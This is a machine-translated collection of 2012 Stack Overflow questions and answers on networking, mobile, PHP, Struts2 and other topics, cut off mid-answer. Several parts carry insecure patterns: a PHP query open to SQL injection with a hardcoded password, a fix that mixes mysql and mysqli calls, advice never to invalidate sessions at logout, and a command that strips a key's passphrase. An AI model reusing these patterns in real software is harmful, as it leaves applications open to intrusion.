您必须[在 UDP 或 TCP 之间进行选择。](http://smblog.iiitd.com/2010/09/advantages-and-disadvantages-of-tcp-and.html)每个协议都有它的优点/缺点。我真的很喜欢那个网站上的两张图片。

## **TCP**

![优势 TCP](../Images/77e5df53d574c856dc8add57f6e8cb53.png)

## **UDP**

![在此处输入图像描述](../Images/37e93c45f2e6f36e45dce42062529e49.png)

我建议您使用 TCP，尤其是当您没有太多实现 UDP 的经验时。此外，我建议您使用 HTTP（在 TCP 之上），因为它在任何编程语言中都可以广泛使用。我认为一个非常简单的解决方案是定义一个 REST API。您可以在节点端使用[express.js和作为客户端的](http://expressjs.com/)[superagent](https://github.com/visionmedia/superagent)轻松创建服务器端（与其他服务器实现交互）。例如，在 java 上，您可以使用[大气铲服务器](https://github.com/Atmosphere/atmosphere)和[async-http-client](https://github.com/jfarcand/async-http-client)

> 当我想用另一种语言创建套接字客户端但服务器使用的是 nodejs 时，有哪些步骤或建议？

我建议使用[JSON](http://en.wikipedia.org/wiki/JSON)进行数据交换。您可以轻松找到任何语言的可靠实现，并且用户浏览器也支持它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T15:10:23.783

TCP 和 UDP 套接字不依赖于语言，如果您在 NodeJS 中有一个 UDP 服务器，在 Java 中有一个 UDP 客户端，那么这应该可以开箱即用。

所以你一定是在你的 NodeJS 或 Java 程序中做错了什么。这是一个简单的 Hello world 程序：

服务器.js：

```
var dgram = require("dgram");
var server = dgram.createSocket("udp4");

server.on("message", function (msg, rinfo) {
  console.log("server got: " + msg + " from " +
    rinfo.address + ":" + rinfo.port);
});

server.on("listening", function () {
  var address = server.address();
  console.log("server listening " +
      address.address + ":" + address.port);
});

server.bind(41234);
// server listening 0.0.0.0:41234 
```

和 UDPClient.java ：

```
import java.io.*;
import java.net.*;

class UDPClient 
{
   public static void main(String args[]) throws Exception
   {
      DatagramSocket clientSocket = new DatagramSocket();
      InetAddress IPAddress =  InetAddress.getByName("localhost");
      byte[] sendData = new byte[1024];
      String sentence = "Hello World!";
      sendData = sentence.getBytes();
      DatagramPacket sendPacket =  new DatagramPacket(sendData, sendData.length, IPAddress, 41234);
      clientSocket.send(sendPacket);
      clientSocket.close();
   }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T14:59:50.143

通过 TCP 或 UDP 连接两个不同的程序应该没有任何问题。事实上，基本目的之一就是解决这种情况。

尝试在[此处](http://nodejs.org/api/dgram.html)使用规范编写您的节点 js 服务器。它应该工作。如果仍然没有，那么也发布您的 java 代码。我们可以挖掘它。

# iphone - 如何每 N 秒接收一次 Youtube 视频状态通知

> ID：10069335
> 
> 赞同：0
> 
> 时间：2012-04-09T05:34:15.147
> 
> 标签：iphone, ios, xcode, youtube

我正在为 iPhone 开发一个应用程序，我在其中运行 Youtube 视频`UIwebView`。在那，我想检索有关视频的所有信息（视频何时开始以及完成视频所需的时间）。我试图每 2 秒获取一次此信息。

我无法得到这样的通知。我也尝试过用 JavaScript 来做这件事，但我在某处读到它需要 Flash Player 而 iPhone 不支持它。所以 JavaScript 不是一个选项。

谁能建议我如何从这里继续前进？谢谢。

我的代码：

```
//
//  YouTubeEmbedViewController.m
//  YouTubeEmbed
//
//  Created by Movik Networks on 11/04/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "YouTubeEmbedViewController.h"

@implementation YouTubeEmbedViewController
@synthesize thumbnailView;

- (void)didReceiveMemoryWarning
{
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

#pragma mark - View lifecycle

// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad
{
    [super viewDidLoad];
    // webView is a UIWebView, either initialized programmatically or loaded as part of a xib.

    NSString *htmlString = @"<html><head><meta name = \"viewport\" content = \"initial-scale = 1.0, user-scalable = no, width = 300\"/></head><body style=\"background:#F00;margin-top:0px;margin-left:0px\"><div><object width=\"300\" height=\"300\"><param name=\"movie\" value=\"http://www.youtube.com/watch?v=oSOooSv1RH0\"></param><param name=\"wmode\" value=\"transparent\"></param><embed src=\"http://www.youtube.com/watch?v=oSOooSv1RH0\"type=\"application/x-shockwave-flash\" wmode=\"transparent\" width=\"300\" height=\"300\"></embed></object></div></body></html>";

    [thumbnailView loadHTMLString:htmlString baseURL:[NSURL URLWithString:@"http://www.google.com"]];

}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T12:08:55.727

您可以将[Youtube API 与客户端库一起使用](https://developers.google.com/youtube/code?hl=de-DE)

然后您可以播放文件`MPMoviePlayerViewController`并使用它的委托功能。

# java - 应用程序的安全问题

> ID：10069336
> 
> 赞同：1
> 
> 时间：2012-04-09T05:34:15.407
> 
> 标签：java, asp.net, python, security

我正在制作一个应用生态系统，其中包括桌面、移动和 Web，所有这些都使用 Web 服务与相同的数据库进行协商。这些应用程序需要高度安全，因为它们将用于控制家庭安全。例如：远程打开/锁定家中的前门，远程打开/关闭保存在家里的钱库。

我希望这些应用程序尽可能安全，同时尽可能减少对授权用户的干扰。我计划包括的一些安全功能是：

**网络应用**

1.  2步验证，使用一次性密码发送到注册手机。
2.  向已注册手机发送有关任何活动的短信更新。
3.  部署 RSA 安全令牌，如[SecurID](http://en.wikipedia.org/wiki/SecurID)

**桌面应用**

1.  将用户绑定到特定（或一组）硬件 id/s。只有映射到特定用户的机器才被允许访问。

**移动应用**

1.  2步验证。
2.  在 Android 移动应用中将用户绑定到 NFC 硬件 ID。（其他平台也一样）

**数据库安全**

1.  没有直接暴露数据库模式/数据。
2.  通过 oauth 令牌提供的所有 API 请求。

**技术栈**

它现在还没有冻结，但我打算使用：

*   Web 服务框架 - Mule/Java
*   数据库 - Postgres
*   Web 框架 - Django/Python
*   移动设备 - Android、Apple、Windows Phone sdks

或 Microsoft 工具 - C#、ASP.NET、SQL Server 2008 R2

在这种情况下，我有以下**具体问题。**

**更新：**根据[Will](https://stackoverflow.com/users/1228/will)的建议，我将我的问题限制在一个方面。

1.  上述安全功能是否存在*漏洞？*
2.  任何其他可以实现的*安全功能，既安全又不会干扰用户？*

# c# - 如何从 Unity 应用程序启动 Android 活动？

> ID：10069340
> 
> 赞同：16
> 
> 时间：2012-04-09T05:34:28.177
> 
> 标签：c#, android, mono, unity3d, interprocess

我知道这似乎是一个微不足道的问题，但我在互联网上的任何地方都找不到任何具体的答案。我在stackoverflow上看到了这个非常相似的问题：[如何从android活动启动Unity应用程序？](https://stackoverflow.com/questions/7686908/how-to-start-unity-application-from-android-activity) 但这与我的问题完全相反。此外，android Activity 必须能够从 Unity 应用程序接收一些输入字符串，就像使用带有行参数的 system() 调用以在 PC 上启动另一个程序一样。

以下是我在 Android 上的测试 Unity 应用程序的测试按钮事件处理程序的代码：

```
private void ExternalAppCallHandler()
{
    if(Application.platform == RuntimePlatform.WindowsEditor)
    {
        Process.Start(@"C:\Program Files (x86)\Notepad++\notepad++.exe");
    }
    else if(Application.platform == RuntimePlatform.Android)
    {
        Process.Start("Internet");
    }
} 
```

当我使用 Unity Editor 进行测试时，单击测试按钮时应用程序成功打开 Notepad++.exe。但是，当我尝试在三星 Galaxy S2 设备上打开“互联网”应用程序时，它失败了。有谁知道为什么会这样？使用 Process.Start 打开另一个 Android 应用程序的正确字符串应该是什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-19T13:40:42.703

我对 Unity 不是很熟悉，但有相当多的 Android 经验。所以把我的回答当作一个建议，而不是一个权威的答案。

查看[从 Unity 中启动 Android 应用程序](http://unity3d.com/support/documentation/Manual/Android-Launch%20an%20Android%20Application%20from%20a%20Unity%20Application.html)，您可以尝试以下操作：

遵循关于[将 Unity 与 Eclipse 集成](http://unity3d.com/support/documentation/Manual/Android-Integrating%20Unity%20With%20Eclipse.html)的指南。

修改步骤 1 中创建的 Java 文件如下：

```
package com.Unity3D.EclipseIntegration;

import android.os.Bundle;

import com.unity3d.player.UnityPlayerActivity;

public class EclipseIntegration extends UnityPlayerActivity {

    private Intent myIntent;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        //Assuming that we want to launch the browser to browse a website
        Uri uri = Uri.parse("http://www.google.com");
        myIntent= new Intent(Intent.ACTION_VIEW, uri);
    }

    public void Launch()
    {       
        startActivity(myIntent);
    }
} 
```

并修改您的 Unity 代码：

```
private void ExternalAppCallHandler()
{
    if(Application.platform == RuntimePlatform.WindowsEditor)
    {
        Process.Start(@"C:\Program Files (x86)\Notepad++\notepad++.exe");
    }
    else if(Application.platform == RuntimePlatform.Android)
    {
        AndroidJavaClass jc = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject jo = jc.GetStatic<AndroidJavaObject>("currentActivity");
        jo.Call("Launch");
    }
} 
```

如果您遇到任何问题，请发布 LogCat 消息。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-08-01T09:23:55.557

试试这个 将此 Launch() 方法更改为静态并传递 Android java 对象，即。像下面这样“jo”。

```
AndroidJavaClass androidJC = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
AndroidJavaObject jo= androidJC.GetStatic<AndroidJavaObject>("currentActivity");
AndroidJavaClass jc = new AndroidJavaClass("package_name.Ur_Actvity_Name");
jc.CallStatic("Launch",jo);` 
```

并将 Launch() 方法更改为：

```
public static Launch(Activity activity)
{
 Intent myIntent = new Intent();
 activity.startActivity(myIntent);
} 
```

希望它会有所帮助。

# jsp - 传递 baselayout.jsp 中的值

> ID：10069343
> 
> 赞同：0
> 
> 时间：2012-04-09T05:35:14.160
> 
> 标签：jsp, struts2, tags, tiles

我有一个场景，

我必须在 layout.jsp 中传递一些值（它是父 jsp），其中定义了瓷砖属性。

现在我的问题是，

我是否可以检索传递给扩展该 layout.jsp 的任何页面的任何 pojo 值。我想在 layout.jsp 中检索 pojo 值

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T08:43:17.580

在前端（在您的情况下是 JSP），只有 4 个范围来存储对象：应用程序、会话、请求和页面。每一个都有自己的生命周期，这应该是不言自明的。

当您只是将对象存储为请求属性时，整个页面（父模板 + 平铺 JSP）都可以访问它，但仅限于该请求。

瓷砖用于基于模板的设计。它无助于将数据从一页传递到另一页。

# python - 只需输入一次 PEM 密码

> ID：10069351
> 
> 赞同：6
> 
> 时间：2012-04-09T05:35:57.453
> 
> 标签：python, twisted, python-2.7

我有一个每 30 秒运行一次的循环，连接到 SSL 服务器 (reactor.connectSSL())，发送消息 (self.transport.write(msg))，然后断开连接 (self.transport.loseConnection())。

问题是每次循环尝试连接时都会询问“输入 PEM 密码”。是否可以只输入一次？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2014-01-03T16:17:07.127

正如 Mikael 所建议的，您可以从密钥中删除密码短语。请注意，这会带来严重的安全风险。

要从密钥中删除密码短语，请执行以下步骤。假设您有一个名为`foo.pem`以下内​​容的文件：

```
-----BEGIN ENCRYPTED PRIVATE KEY-----
...
-----END ENCRYPTED PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE----- 
```

执行以下命令：

```
openssl rsa -in foo.pem -out foo_unencrypted.pem 
```

系统将提示您输入密码，并作为回报收到一个`foo_unencrypted.pem`包含以下内容的文件：

```
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY----- 
```

该文件缺少`BEGIN CERTIFICATE ---- END CERTIFICATE`上面的部分，因此将其复制粘贴`foo.pem`到末尾`foo_unencrypted.pem`：

```
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE----- 
```

如果您使用该文件`foo_unencrypted.pem`，您现在将不再被提示“输入 PEM 密码”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T10:38:08.403

我最终找到了这篇文章：[Auto enter pass phrase in case of Python ssl Client/Server](https://stackoverflow.com/questions/2771912/auto-enter-pass-phrase-in-case-of-python-ssl-client-server)，他们建议您从密钥中删除密码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-14T20:33:34.157

我试图运行该命令，但它没有这样做。而且我的应用程序每次启动时都会询问 PEM para 短语。

```
$ openssl rsa -in chatbot.key -out chatbot.unprotectedkey
Enter pass phrase for chatbot.key:
unable to load Private Key
33432:error:0607607D:digital envelope routines:PKCS5_v2_PBE_keyivgen:unsupported prf:p5_crpt2.c:230:
33432:error:06074078:digital envelope routines:EVP_PBE_CipherInit:keygen failure:evp_pbe.c:101:
33432:error:23077073:PKCS12 routines:PKCS12_pbe_crypt:pkcs12 algor cipherinit error:p12_decr.c:83:
33432:error:2306A075:PKCS12 routines:PKCS12_item_decrypt_d2i:pkcs12 pbe crypt error:p12_decr.c:123:
33432:error:0907B00D:PEM routines:PEM_READ_BIO_PRIVATEKEY:ASN1 lib:pem_pkey.c:125: 
```

# version-control - hg 恢复或更新以浏览提交，然后更改回最新？

> ID：10069352
> 
> 赞同：1
> 
> 时间：2012-04-09T05:36:05.563
> 
> 标签：version-control, mercurial, tortoisehg

如果您只是想编译并运行一些代码，那么无需任何更改即可返回，标准做法是什么？（编辑：假设父母一开始是小费）

```
hg revert -C -r 0 --all

hg revert -C -r tip --all 
```

## 或者

```
hg update -C -r 0

hg update -C -r tip 
```

我可以删除未提交的东西（-C），但有什么更喜欢的方式。 ~~同样烦人的 tortoisehg 似乎并没有通过单击任何想法来执行还原工作流程？~~ [http://comments.gmane.org/gmane.comp.version-control.mercurial.tortoisehg.user/2728](http://comments.gmane.org/gmane.comp.version-control.mercurial.tortoisehg.user/2728)

PS 我知道 update move 是父级，而 revert 不是。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T13:15:02.610

更新是更好的选择。这样，如果您忘记并进行代码调整，您就可以提交它，可能会创建一个新的头部，这没关系。

# python - python脚本中的语法错误

> ID：10069353
> 
> 赞同：1
> 
> 时间：2012-04-09T05:36:07.747
> 
> 标签：python, syntax-error

我编写了以下脚本，它生成一个`SyntaxError`：

```
#!/usr/bin/python
print "Enter the filename: "
filename = raw_input("> ")
print "Here is your file %r: ", % filename

txt = open(filename)
print txt.read()
txt.close() 
```

这是错误：

```
 File "ex02.py", line 4
    print "Here is your file %r: ", % filename
                                    ^
SyntaxError: invalid syntax 
```

我应该如何解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:38:56.383

那里不能有逗号。

```
print ("Here is your file %r: " % filename), 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:38:49.907

不需要昏迷，试试：

```
filename = raw_input("> ")
print "Here is your file %r: " % filename 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T05:41:55.067

麻烦就在这里：

```
print "Here is your file %r: ", % filename
                              ^ 
```

当`print`找到一个逗号时，它将它用作参数分隔符，如下所示：

```
>>> print 1,2
1 2 
```

在这种情况下，下一个参数必须是有效的，而序列`% filename`不是*。*

你的意思无疑是：

```
print "Here is your file %r: " % filename 
```

根据以下成绩单：

```
>>> filename = "whatever"

>>> print "file is %r", % filename
  File "<stdin>", line 1
    print "file is %r", % filename
                        ^
SyntaxError: invalid syntax

>>> print "file is %r" % filename
file is 'whatever' 
```

# cakephp - CakePHP HTML 助手

> ID：10069355
> 
> 赞同：0
> 
> 时间：2012-04-09T05:36:29.733
> 
> 标签：cakephp, cakephp-2.0, cakephp-2.1

我正在尝试使用 CakePHP 2.1 中的 HTML Helper 复制以下代码。不确定如何将 Span 标签包含到标签中。

```
<div class="backTo">
    <a href="#" title="">
      <img src="images/icons/topnav/mainWebsite.png" alt="" />
      <span>Main website</span>
    </a>
</div> 
```

我试过的

```
<?php echo $this->Html->image("icons/topnav/mainWebsite.png", array("alt" => "Back", 'url' => array('controller' => 'pages', 'action' => 'display', 'home')); ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:43:06.323

```
echo $this->Html->link(
    $this->Html->image('...', array(...)) . '<span>Main website</span>',
    array('controller' => ...),
    array('escape' => false)
); 
```

# javascript - 在 IE 中禁用收缩以适应

> ID：10069358
> 
> 赞同：0
> 
> 时间：2012-04-09T05:37:15.767
> 
> 标签：javascript, jquery, asp.net, internet-explorer

默认情况下 IE 是 enable `Shrink-to-Fit`。用户在打印页面时对此不满意。它获取整个网络的数据。但他们只需要在他们看到的时候。

**缩小以适合**

![缩小以适合](../Images/3fde088860978df6e5b52dbd6ad73d7b.png)

**通过禁用 Shrink-to-Fit**

![在此处输入图像描述](../Images/ea506296fdf2fb07c4c389faa2ef48dc.png)

我只是告诉用户手动设置。

无论如何都要使用javascript或其他禁用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:51:28.367

你可以试试 jQuery 打印库；

[http://www.swhistlesoft.com/blog/2011/08/05/1411-a-jquery-print-library-that-fixes-the-ie7-shrink-to-fit-issue](http://www.swhistlesoft.com/blog/2011/08/05/1411-a-jquery-print-library-that-fixes-the-ie7-shrink-to-fit-issue)

# iphone - 在 iPhone 应用程序上使用 shareKit 时出错？

> ID：10069362
> 
> 赞同：0
> 
> 时间：2012-04-09T05:37:55.353
> 
> 标签：iphone, sharekit

最近我使用 shareKIt 在我的 iPhone 应用程序上开发共享属性，并按照他们的指示添加了所需的框架，但是在运行它们时没有错误，而是数字或编译器警告。同样，当我从操作表中单击 Facebook/Twitter 时，应用程序会卡住并崩溃。

我在 SHKActionSheet.m 上收到错误说 badAccess

```
- (void)dealloc
{
[item release];
[sharers release];
[super dealloc];
} 
```

和编译器警告

```
SHKActionSheet *as = [[SHKActionSheet alloc] initWithTitle:SHKLocalizedString(@"Share")
                                                      delegate:self
                                             cancelButtonTitle:nil
                                    destructiveButtonTitle:nil
                                         otherButtonTitles:nil]; 
```

说

```
incomplete pointer type sending "Class" to parameter of type 'id< UIActionSheetDelegate >' 
```

需要一些帮助，否则他们还有其他方式来实现共享属性吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:37:06.803

您使用了错误的 SHKActionSheet 分配方法，请使用以下代码。

```
SHKItem *item = [SHKItem text:@"test"];
SHKActionSheet *actionSheet = [SHKActionSheet actionSheetForItem:item];

[actionSheet showFromRect:CGRectMake(0, 0, 320, 250) inView:self.view animated:YES]; 
```

# javascript - 为什么这个全局计数器变量不能与 setTimeout 一起使用？

> ID：10069373
> 
> 赞同：0
> 
> 时间：2012-04-09T05:39:13.753
> 
> 标签：javascript, animation, global-variables, settimeout, counter

我试图通过交替每个其他字符的颜色来为一些文本设置动画。我的代码正在以一种方式对其进行样式设置，但`setTimeout`没有再次调用它来替换文本颜色。

问题似乎是我使用全局变量作为计数器，这可能是我忽略的一个简单问题。

有任何想法吗？这是我的javascript代码：

```
var num = 0;
function animateText(){
    var str = "";
    var title = document.getElementById("title").innerHTML;

    for(var i = 0; i < title.length; i++){
        if(num % 2 == 0){
            if(i % 2 == 0){
                str += '<span style = "color: silver;">' + title.charAt(i) + '</span>';
            } else {
                str += title.charAt(i) + "";
            }
        } else {
            if(i % 2 != 0) {
                str += '<span style = "color: silver;">' + title.charAt(i) + '</span>';
            } else {
                str += title.charAt(i) = "";
            }
        }
    }

    document.getElementById("title").innerHTML = str;
    num++;

    if(num == 10) 
        num = 0;

    setTimeout("animateText()", 500);

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:01:38.573

除了乔纳森指出的错字之外，您的逻辑似乎有缺陷。第一次通过该函数，您将获得初始字符串并构建一些带有各种`<span>`标签的 HTML。下一次通过该函数时，您从 DOM 元素中获取 innerHTML 并再次开始处理它，就好像它只是您的字符串一样，但这次是之前的 HTML，其中包含所有标签 - 它不是您开始使用的字符串。您需要将原始字符串保存在未修改的位置，以便每次通过该函数都可以仅从文本字符串开始，而不是每次都建立在先前格式化的 HTML 之上。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:46:21.287

您有语法错误/错字：

```
str += title.charAt(i) = "";
//                     ^ 
```

这是一个非法分配，JavaScript 控制台会告诉你：

> ```
> ReferenceError: Invalid left-hand side in assignment 
> ```

但是，您也可以传递`setTimeout`函数引用而不是字符串：

```
setTimeout(animateText, 500); 
```

这将跳过内部`eval`，并允许超时使用在“全局”以外的范围中定义的函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:07:52.233

全局变量就好了

您的代码中有一个语法在这一行

```
str += title.charAt(i) = ""; 
```

这不是一个有效的分配

# .net - Linq to SQL 创建表

> ID：10069375
> 
> 赞同：8
> 
> 时间：2012-04-09T05:39:56.560
> 
> 标签：.net, wpf, linq-to-sql, c#-4.0

我需要编写一个 WPF(4.0) 应用程序，它有一个数据库，但其中没有表。该应用程序必须在数据库中创建一些表，然后开始使用它们。我想知道，有没有办法在 Linq to SQL 中做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:43:19.773

您可以以编程方式执行此操作。即您可以根据给定的参数以编程方式创建您的表格，也可以建立表格之间的关系...... :)

由于没有直接函数**create table**，您可以使用`ExecuteCommand`- 方法`DataContext`运行一些 T-SQL 语句来创建表。

# struts2 - 这是会话管理的正确吗？

> ID：10069381
> 
> 赞同：1
> 
> 时间：2012-04-09T05:40:39.933
> 
> 标签：struts2, session-state

我正在为我的 Web 应用程序使用 struts2。现在对于会话管理，我们实际上将用户 ID 保存在会话中（即 DB 标识符），并且在注销时我们从会话对象中删除此用户 ID。我们的会话对象（封装了用户 ID）正在实现会话感知接口，因此我想我们会在会话映射中自动获取所有与会话相关的信息。

我的基本怨恨是注销。我们只是从会话中删除用户 ID，而不是真正“使”会话“无效”，例如 session.invalidate()。

我是 struts2 的新手，甚至是我正在描述的这个产品原型。那么有人可以告诉我从会话中删除用户ID是否足够，如果不是，那么我可能会遇到什么样的安全隐患？我还应该在注销时执行 session.invalidate 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:30:57.510

永远不要`session.invalidate();`只为会话属性设置一个空值就足够了（也不需要删除该属性！）。你的支票应该是这样的：

```
if( is the attribute present is session)
    if( is the value of attribute null) {
         go to login page;
    }
    else {
        go to welcome page;
    }
}
else {
     go to login page;
} 
```

使用`session.invalidate()`意味着您告诉已注销的用户没有有效的会话，他是我们网站的诅咒:))

更新：来自 HTTPSession[文档](http://docs.oracle.com/cd/E17802_01/webservices/webservices/docs/1.6/api/javax/servlet/http/HttpSession.html)

> 无效（）
> 
> 使此会话无效，然后解除绑定到它的任何对象。

因此，在 session.invalidate() 之后尝试访问存储在会话范围（如果有的话）中的变量时，您会遇到错误

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:58:52.683

在大多数情况下，从会话中删除用户 ID 应该足以告诉您的应用程序用户已退出。如果可以的话，我还建议删除所有其他会话变量并使会话 cookie 无效。如果您的代码使用其他会话变量而不首先检查是否设置了用户 ID，这将防止任何意外行为。

我通常将用户 ID 存储在会话中以指示用户已登录并告诉我用户是谁。如果未设置此值，则我将用户踢到登录页面。

# php - PHP While Loop Help-“警告：mysqli_fetch_assoc() 期望参数 1 为 mysqli_result......”

> ID：10069385
> 
> 赞同：-1
> 
> 时间：2012-04-09T05:41:25.843
> 
> 标签：php, html, sql

当心，我是一个编码 n00b 并且刚刚得到一个基本的 PHP 任务。当我尝试打开它时，我不断收到此错误消息

```
Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in /home/jpl8ce/public_html/php_grocery1.php on line 20 
```

这是我正在做的事情的 .php 和 .html 文件。基本上，它是一个杂货数据库，我试图在其中打印商店营业时间、地址和商店名称，其中包含用户在表单中输入的商品。

```
<html>
<head>
<title>Grocery Results!</title>
</head>
<body>
<h1>
<?php
$connect = mysqli_connect("localhost","jpl8ce","jpl8ce@siedb","grocery");
$item_name = $_post["input1"];

$query_String = " SELECT Stores.Name, Price, Address, Open_Time, Close_Time
FROM (Stores JOIN Carry ON Stores.Store_ID = Carry.Store_ID) JOIN Items ON Carry.Product_ID = Items.Product_ID
WHERE Items.name = $item_name
ORDER BY Close_Time DESC";

$result = mysqli_query($connect, $query_String);

while ($row = mysqli_fetch_assoc($result)) 
{

echo '<P>'.$row["Stores.Name"].', '.'</P>'; 
//echo '$' number_format($row["Price"],2).', ';
echo '<P>'.$row["Address"] .', '.'</P>';
echo '<P>'.$row["Open_Time"] .', '.'</P>';
echo '<P>'.$row["Close_Time"].'</P>';
}

mysqli_close($connect);  
?>
</h1>
</body>
</html> 
```

这是我的 HTML 代码

```
<html>
<head>
<title>Grocery Database Search</title>
</head>
<body>
<H1> Grocery Database Search! </H1>
<IMG SRC='grocery_cart_2.jpg'/>
<P> Use this Search Engine to input a name of an item.
After clicking the Search button, the price of the item, as well as the address and hours of the store 
the item is located at will be displayed. </P>

<form action="php_grocery1.php" method="POST">
<p>Item: <input type="text" name="input1"/></p>
<p><input type="submit" value="Search!"/></p>
</form>
</body>
</html> 
```

再次感谢各位！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:06:28.717

我发现您的代码存在一些问题：

*   所有超全局变量都必须大写。替换`$_post["input1"];`为`$_POST["input1"];`
*   您的查询容易受到 SQL 注入攻击。每当您想将用户提交的数据放入查询中时，请使用转义函数，例如`mysql_real_escape_string()`（[请参阅此处的 PHP 文档](http://www.php.net/manual/en/function.mysql-real-escape-string.php)）。
*   此外，传递给 SQL 查询的字符串必须在单引号内（注意`\'`下面的转义引号）
*   为了准确检测问题（可能正在发生，您应该添加错误处理代码，如下所示：

    ```
    <html>
        <head>
            <title>Grocery Results!</title>
        </head>
        <body>
            <?php
                if(!$connect = mysqli_connect("localhost","jpl8ce","jpl8ce@siedb","grocery"))
                    die('Error connecting to DB!: ' . mysql_error());

                $item_name = $_POST["input1"];

                $query_String = 'SELECT Stores.Name, Price, Address, Open_Time, Close_Time
                    FROM (Stores JOIN Carry ON Stores.Store_ID = Carry.Store_ID) JOIN Items ON Carry.Product_ID = Items.Product_ID
                    WHERE Items.name = \'' . mysql_real_escape_string($item_name) . '\' ORDER BY Close_Time DESC';

                if(!$result = mysqli_query($connect, $query_String))
                    die('Error on query: ' . mysql_error($connect));

                while ($row = mysqli_fetch_assoc($result)) {
                    echo '<P>' . $row["Stores.Name"] . ', ' . '</P>';
                    //echo '$' number_format($row["Price"],2).', ';
                    echo '<P>' . $row["Address"] . ', ' . '</P>';
                    echo '<P>' . $row["Open_Time"] . ', ' . '</P>';
                    echo '<P>' . $row["Close_Time"] . '</P>';
                }

                mysqli_close($connect);
            ?>
        </body>
    </html> 
    ```

希望这可以帮助。

# android - 在 COCOS2D Android 中旋转和缩放 Sprite 图像

> ID：10069389
> 
> 赞同：0
> 
> 时间：2012-04-09T05:41:50.917
> 
> 标签：android, cocos2d-iphone, rotation, scale

我正在为 Android 使用 COCOS2D。我想旋转一个矩形精灵并将其缩放到不同的高度，但它的两个顶点位于固定位置。我的意思是，在矩形的四个顶点中，我只希望两个顶点移动到不同的点，甚至将矩形缩放到不同的长度。不同长度的类似示例：温度计，其中矩形水银水平向上和向下固定底部的两个顶点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:08:27.890

要做到这一点，请将您移动`anchorPoint`到您希望保持不变的边缘。假设您将您`anchorPoint`的温度计精灵移动到底部边缘，当您缩放它时，只有顶部边缘会移动。的`anchorPoint`浮点值为 0..1，对应于精灵尺寸的 0-100%。

请注意，这会影响您`position`，您可能需要调整精灵宽度（或高度，取决于您的设置方式）的 1/2。你的`anchorPoint`精灵位于你的精灵所在的位置`position`。所以默认情况下，`anchorPoint`位于 (0.5, 0.5) 这就是为什么你的精灵在你放置它的任何地方都居中。如果您将其更改`anchorPoint`为 (0.5, 0)，则精灵将水平居中，但精灵的底部将与您设置的任何位置对齐`position`，并且它将远离锚点缩放。

这些链接也将证明对您非常宝贵：

[http://www.qcmat.com/understanding-anchorpoint-in-cocos2d/](http://www.qcmat.com/understanding-anchorpoint-in-cocos2d/)

[http://cocos2d-central.com/topic/436-position-vs-anchorpoint/](http://cocos2d-central.com/topic/436-position-vs-anchorpoint/)

[http://www.cocos2d-iphone.org/forum/topic/1557](http://www.cocos2d-iphone.org/forum/topic/1557)

# ios - 在IOS邮件应用程序中，如何在邮件正文后显示邮件附件？

> ID：10069393
> 
> 赞同：1
> 
> 时间：2012-04-09T05:41:56.750
> 
> 标签：ios, uitableview, uiwebview

我正在 iOS 中开发邮件应用程序。

在显示电子邮件的详细信息/内容时，我无法弄清楚如何同时显示邮件正文和附件。

我在 iPhone 中搜索了一些邮件应用程序，例如原始邮件应用程序和 Sparrow，它们以几乎相同的方式执行此操作。详细邮件视图是一个UITableview，发送者和接收者是一个UItableviewcell，主题是一个UItableviewcell，邮件正文和附件是一个UItableviewcell。由于邮件正文可能有html内容，我认为它需要使用UIWebview来显示，并且附件是一个新的UITableView，其中行是附件的数量。

我的问题是：

如何将 UIwebview 和 UItableView 放在一个 UITableViewCell 中？

我试图分配一个 tableviewcell 并向单元格添加一个 webview 和一个 tableview，但效果不佳。

谁能告诉我实现此要求的更好方法是什么？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T13:59:18.940

我建议您对所有单元格使用相同的表格视图，而不是在表格中创建表格 =)

在

```
-cellforrowat...{
} 
```

你可以制定条款

```
